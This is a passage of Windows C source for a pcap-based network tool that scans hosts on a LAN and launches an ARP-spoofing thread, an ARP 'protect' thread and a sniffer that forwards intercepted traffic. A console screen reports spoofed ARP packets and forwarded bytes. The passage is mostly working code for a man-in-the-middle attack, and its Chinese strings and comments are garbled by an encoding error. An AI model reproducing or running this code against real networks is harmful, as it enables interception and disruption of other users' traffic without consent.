        if(clock()-timestamp>gl_Sys_Con.interval)
        {
            memset(ARPPacket,NULL,sizeof(ARPPacket));

            Fill_ARPPACKET(ARPPacket,sizeof(ARPPacket),gl_Sys_Con.gatewayMAC,gl_Sys_Con.gatewayIp,\
                           gl_Sys_Con.myMAC,gl_Sys_Con.myIPAddress,2);
            SendPacket(gl_Sys_Con.hpcap,ARPPacket,sizeof(ARPPacket));
            arpPacketCount++;
            timestamp=clock();
        }
        Sleep(1);
    }

    return 0;
}

DWORD WINAPI print_log_thread(LPVOID para)
{
    int aliveCount,n,notResHost;
    HOST_INFO *pNode=NULL;

    while(1)
    {
        for(aliveCount=notResHost=n=0,pNode=glp_Host_List_Header; pNode!=NULL; pNode=pNode->next)
        {
            if(pNode->alive)
            {
                aliveCount++;
                if(memory_empty(pNode->mac,6))
                {
                    notResHost++;
                }
            }
            n++;
            if(gl_Sys_Con.respondMode==2 && pNode->alive)
            {

            }
        }
        if(print_lock) return 0;
        system("cls");
        printf("%s\n",about_str);
        if(gl_Sys_Con.sceneMode==2 && gl_Sys_Con.respondMode==1)
        {
            notResHost=aliveCount-notResHost;
            notResHost=n-notResHost;
            aliveCount=n;
        }
        printf("\t       ����IP��%s",gl_Sys_Con.myIPAddress);
        printf("\t����IP��%s\n",gl_Sys_Con.gatewayIp);
        printf("\t-------------------------------------------------------------\n");
        printf("\t|\t����������\t%d\t\t��\t\t    |\n",subHostCount);
        printf("\t|\t��������:\t%d\t\t��\t\t    |\n",aliveCount);
        printf("\t|\t��Ӧ��������\t%d\t\t��\t\t    |\n",notResHost);
        printf("\t|\t̽�������\t%d\t\t��\t\t    |\n",macScanCount);
        printf("\t|\tӦ��ARP��:\t%d\t\t��\t\t    |\n",arpPacketCount);
        printf("\t|\t����������:\t%d\t\t��\t\t    |\n",flowPacketCount);
        printf("\t|\tת����������:\t%.2f\t\tKb/s\t\t    |\n",recordFlowSpeed/1024);
        printf("\t|\t��ת������:\t%.2f\t\tMb\t\t    |\n",totalFlowSize/1024/1024);
        printf("\t-------------------------------------------------------------\n");

        Sleep(1000);
    }

    return 0;
}

int main(int argc,char *argv[])
{
    char devName[265];
    char myIPAddress[16],myMAC[6];
    char gatewayIp[16];
    pcap_t *hpcap=NULL;
    HANDLE hThread = NULL;

    InitializeCriticalSection(&cs_flowSpeed);
    InitializeCriticalSection(&cs_arpCount);
    InitializeCriticalSection(&cs_threadCount);
    srand(time(NULL));

    SMALL_RECT winPon= {0,0,80,30};
    HANDLE con=GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleWindowInfo(con,TRUE,&winPon);
    CONSOLE_CURSOR_INFO cursor_info = {1, 0};
    SetConsoleCursorInfo(GetStdHandle(STD_OUTPUT_HANDLE), &cursor_info);

    about();
    if(init_config()!=0)
    {
        printf("�����ļ������������������ɡ�\n");
        getch();
        exit(-1);
    }

    system("cls");
    if(ChooseDev(devName,sizeof(devName),myIPAddress)!=TRUE)
    {
        printf("��ȡ����ʧ�ܡ�\n");
        getch();
        return -1;
    }
    //��ȡ����������Ϣ
    if(GetAdapterInfo(myIPAddress,myMAC,gatewayIp)!=TRUE)
    {
        printf("��ȡ������Ϣʧ�ܡ�\n");
        getch();
        return -1;
    }
    //������
    if((hpcap=OpenAdapter(devName))==NULL)
    {
        printf("�����򿪳���\n");
        getch();
        return -1;
    }

    strcat(gl_Sys_Con.gatewayIp,gatewayIp);
    strcat(gl_Sys_Con.myIPAddress,myIPAddress);
    memcpy(gl_Sys_Con.myMAC,myMAC,6);
    gl_Sys_Con.hpcap=hpcap;

    if(init_host_list()!=0)
    {
        printf("��ʼ�������б�ʧ�ܣ�\n");
        getch();
        return -1;
    }

    //����ɨ��MAC�߳�
    hThread = CreateThread(NULL,0,scan_host_mac_thread,NULL,0,NULL);
    if(hThread == NULL)
    {
        puts("Create scan_host_mac_thread failed.");
        getch();
        exit(-1);
    }

    if(gl_Sys_Con.respondMode==1)
    {
        //����ARP��ƭ�߳�
        hThread = CreateThread(NULL,0,arp_spoof_thread,NULL,0,NULL);
        if(hThread == NULL)
        {
            puts("Create arp_spoof_thread failed.");
            getch();
            exit(-1);
        }
    }

    //��������ARP�����߳�
    hThread = CreateThread(NULL, 0, arp_protect_thread, NULL, 0, NULL);
    if(hThread == NULL)
    {
        puts("Create arp_protect_thread failed.");
        getch();
        exit(-1);
    }

    //�������������߳�
    hThread = CreateThread(NULL,0,flow_clear_thread,NULL,0,NULL);
    if(hThread == NULL)
    {
        puts("Create flow_clear_thread failed.");
        getch();
        exit(-1);
    }

    //������־�߳�
    hThread = CreateThread(NULL,0,print_log_thread,NULL,0,NULL);
    if(hThread == NULL)
    {
        puts("Create print_log_thread failed.");
        getch();
        exit(-1);
    }

    //������̽ת��
    sniffer();

    return 0;
}
